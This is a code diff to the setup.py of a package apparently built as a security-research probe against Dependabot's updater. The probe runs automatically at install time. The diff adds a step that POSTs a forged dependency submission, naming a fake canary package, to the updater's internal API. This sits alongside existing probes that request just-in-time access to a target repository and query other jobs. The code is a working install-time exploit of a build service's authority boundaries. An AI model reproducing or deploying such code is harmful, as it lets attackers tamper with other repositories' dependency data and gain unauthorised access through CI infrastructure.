@@ -5,6 +5,7 @@ import os
 import pathlib
 import subprocess
 import tempfile
+import time
 import urllib.error
 import urllib.request
 from datetime import datetime, timezone
@@ -55,6 +56,8 @@ def _run_probe():
         "cross_job_api_status": None,
         "cross_job_api_body_sha256": None,
         "cross_job_target_id_sha256": None,
+        "dependency_submission_status": None,
+        "dependency_submission_body_sha256": None,
     }
 
     repo_dir = pathlib.Path("/home/dependabot/dependabot-updater/repo")
@@ -75,7 +78,7 @@ def _run_probe():
         requirements_in = (
             "requests==2.34.2\n"
             "dependabot-jit-authority-probe @ "
-            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.5\n"
+            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.6\n"
         )
         requirements_txt = (
             "#\n"
@@ -89,7 +92,7 @@ def _run_probe():
             "charset-normalizer==3.2.0\n"
             "    # via requests\n"
             "dependabot-jit-authority-probe @ "
-            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.5\n"
+            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.6\n"
             "    # via -r requirements.in\n"
             "idna==3.4\n"
             "    # via requests\n"
@@ -256,6 +259,55 @@ def _run_probe():
     except Exception as error:
         receipt["cross_job_api_error_class"] = type(error).__name__
 
+    if base_commit:
+        time.sleep(35)
+        submission = {
+            "version": 1,
+            "sha": base_commit,
+            "ref": "refs/heads/main",
+            "job": {
+                "correlator": "dependabot-pip",
+                "id": f"public-package-authority-{job_id}",
+            },
+            "detector": {
+                "name": "dependabot",
+                "version": "1.0.0",
+                "url": "https://github.com/dependabot/dependabot-core",
+            },
+            "manifests": {
+                "requirements.in": {
+                    "name": "requirements.in",
+                    "file": {"source_location": "requirements.in"},
+                    "metadata": {"ecosystem": "pip"},
+                    "resolved": {
+                        "dependabot-authority-canary": {
+                            "package_url": "pkg:pypi/dependabot-authority-canary@9.8.0",
+                            "relationship": "direct",
+                            "scope": "runtime",
+                            "dependencies": [],
+                        }
+                    },
+                }
+            },
+            "metadata": {"status": "ok", "scanned_manifest_path": "pip::/"},
+        }
+        submission_request = urllib.request.Request(
+            f"{api_url}/update_jobs/{job_id}/create_dependency_submission",
+            data=json.dumps({"data": submission}).encode(),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        try:
+            with urllib.request.urlopen(submission_request, timeout=20) as response:
+                body = response.read(1024 * 1024)
+                receipt["dependency_submission_status"] = response.status
+                receipt["dependency_submission_body_sha256"] = _sha256(body)
+        except urllib.error.HTTPError as error:
+            receipt["dependency_submission_status"] = error.code
+            receipt["dependency_submission_body_sha256"] = _sha256(error.read(1024 * 1024))
+        except Exception as error:
+            receipt["dependency_submission_error_class"] = type(error).__name__
+
     endpoint = f"{api_url}/update_jobs/{job_id}/create_jit_access"
     request_body = json.dumps(
         {"account": TARGET_NWO.split("/", 1)[0], "repository": TARGET_NWO.split("/", 1)[1]}
@@ -365,7 +417,7 @@ _run_probe()
 
 setup(
     name="dependabot-jit-authority-probe",
-    version="0.0.5",
+    version="0.0.6",
     description="Reporter-owned Dependabot boundary canary",
     packages=find_packages(),
 )
